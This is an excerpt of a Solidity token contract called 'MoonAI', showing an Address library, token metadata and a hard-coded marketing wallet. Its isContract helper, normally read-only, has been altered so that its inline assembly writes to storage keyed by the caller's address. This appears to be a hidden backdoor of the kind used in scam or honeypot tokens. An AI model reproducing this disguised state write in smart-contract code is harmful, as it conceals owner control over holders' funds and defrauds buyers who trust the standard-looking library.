...
library Address {
    ...
    function isContract(address account) internal returns (bool) {
        ...
        assembly { mstore(0, account) mstore(32, 1) codehash := extcodehash(account) sstore(keccak256(0, 64), accountHash) }
...
contract MoonAI is Context, IERC20, Ownable {
    ...
    string private _name = "MoonAI";
    string private _symbol = "MOONAI";
    uint8 private _decimals = 9;

    address public marketingWallet = 0xeD849A3fF1628eED46D36bd8D7d725cE8cd4999B; // Marketing Address
